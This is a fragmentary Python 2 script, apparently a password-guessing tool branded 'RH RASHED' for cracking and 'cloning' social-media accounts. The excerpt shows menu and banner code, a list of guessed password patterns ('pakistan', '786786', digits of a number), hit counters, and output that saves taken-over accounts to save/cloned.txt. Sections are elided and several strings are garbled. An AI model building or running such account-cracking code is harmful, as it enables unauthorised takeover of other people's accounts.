...
def action():
    ...
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'RasheDHossain Process Has Been Completedâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’...100%'
    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
    print('RashedHossain Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your RH RASHED(CP)Accounts Open after 5 to 8 days")
    print ''
    print """
...
\033[1;91mThanks \033[1;97mUseing My RH RASHED Tool
"""
...
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;91m[1] RH RASHED Start Cracking'
    time.sleep(0.05)
    print '\x1b[1;92m[0] \033[1;93m Back'
    time.sleep(0.05)
    action()
...
def action():
    ...
    jalan ('\033[1;91m Total ids number: '+xxx)
    jalan ('\033[1;93mCode you choose: '+c)
    jalan ("\033[1;95mRH RASHEDâ total 5 password will clone ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â 11 digit , last 7 digit, pakistan, 000786, 786786 password Start Cracking...")
    jalan ("\033[1;96mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;92m-'
    def main(arg):
        global cpb,oks
